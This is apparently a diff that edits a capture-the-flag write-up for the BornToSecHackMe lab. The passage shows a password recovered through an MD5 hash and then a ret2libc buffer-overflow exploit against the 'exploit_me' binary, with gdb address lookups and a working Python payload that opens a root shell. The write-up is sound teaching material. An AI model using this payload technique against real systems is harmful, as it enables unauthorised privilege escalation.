@@ -1091,13 +1091,20 @@ t.forward(100)
 t.backward(200)
 
 ```
-We can test this script on this [website](https://www.codetoday.co.uk/code). It seems that the word we should find is `SLASH`. The issue is that this password is not the right one to connect with `zaz` via ssh. Reading the last lines of turtle once again, we notice the word `digest`, like in `Message Digest Algorithm 5`. The md5 hash of `SLASH` is `646da671ca01bb5d84dbb5fb2238dc8e`. 
+We can test this script on this [website](https://www.codetoday.co.uk/code). It seems that the word we should find is `SLASH`. The issue is that this password is not the right one to connect with `zaz` via ssh. Reading the last line of turtle once again, we notice the word `digest`, as in `Message Digest Algorithm 5`.
+
+The md5 hash of `SLASH` is:
+```bash
+$ echo -n "SLASH" | md5sum
+646da671ca01bb5d84dbb5fb2238dc8e
+```
 
 #### **Step 11 - SSH (zaz)**
 
 Once connected to zaz via ssh, we discover a directory named `mail` and a binary called `exploit_me`. Unless I am mistaken, the `mail` directory won't be useful this time. Let's have a look at `exploit_me`.
 
-Unfortunately, Ghidra gives us nothing really useful except this:
+Unfortunately, Ghidra gives us nothing really useful, except this:
+
 ```
 bool main(int param_1,int param_2)
 
@@ -1112,7 +1119,7 @@ bool main(int param_1,int param_2)
 }
 ```
 
-.Let's focus on gdb.
+Let's focus on gdb:
 
 ```
 ┌──(kali㉿kali)-[~]
@@ -1154,9 +1161,9 @@ Non-debugging symbols:
 0x080484ec  _fini
 ```
 
-We notice a called to the function `strcpy`. This function is vulnerable to buffer overflow, indeed it takes no parameters specifying the length of the string.
+We notice a call to the function `strcpy`. This function is vulnerable to buffer overflow, indeed it takes no parameters specifying the length of the string.
 
-Testing the binary we see that it echoes on the stdin the argument we give.
+Testing the binary, we see that it echoes the argument we give it to stdout.
 
 ```
 ┌──(kali㉿kali)-[~]
@@ -1182,11 +1189,11 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 
 ```
 
-140 is thus our pivot to exploit the binary. The idea is to trick `exploit_me`, make it print 140 and then give it an address that will point on /bin/sh in order to launch a root shell. This technique is called **ret2libc**. The difference with a basic buffer overflow attack which normally overwrite the return address with the address of a malicious function, is that we overwrite the address of the return function with the address of the `system` libc function. In this case we want the system function to launch `/bin/sh`, more precisely we want `system("/bin/sh")`.
+140 is thus our pivot to exploit the binary. The idea is to trick `exploit_me`, make it print 140 "A"s and then give it an address that will point to `/bin/sh` in order to launch a root shell. This technique is called **ret2libc**. The difference with a basic buffer overflow attack which would normally overwrite the return address with the address of a malicious function, is that we overwrite the address of the return function with the address of the `system` libc function. In this case we want the system function to launch `/bin/sh`, more precisely we want `system("/bin/sh")`.
 
-To do so, let's follow some steps.
+To do so, let's follow these steps.
 
-First, using gdb, we find the address of `system`.
+First, let's find the address of `system` using gdb.
 
 ```
 zaz@BornToSecHackMe:~$ gdb exploit_me 
@@ -1210,7 +1217,7 @@ $2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
 ```
  The address of exit is `0xb7e5ebe0`.
  
- Now we need the address of the string "/bin.sh". To do so let's find the range of address were is located the libc and search for the string.
+ Now we need the address of the string "/bin.sh". To do so let's find the range of addresses were the libc is located and search for the string.
 
 ```
 (gdb) info proc map
@@ -1237,16 +1244,21 @@ Mapped address spaces:
 ```
 We find the address of "/bin/sh" which is `0xb7f8cc58`.
 
-Let's craft our payload: 
+Let's craft our payload following this structure: 
+
+```
+A * 140 padding | system address | exit address | /bin/sh address
 
 `python -c 'print("A" * 140 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7")'`
+```
 
-We run `exploit_me` with our payload as argument
+We run `exploit_me` with our payload as argument:
 
 ```
 ./exploit_me `python -c 'print("A" * 140 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7")'`
 ```
-And we are root!
+
+And we are root! (Prove it with `whoami`!)
 
 ### **Used tools**
 
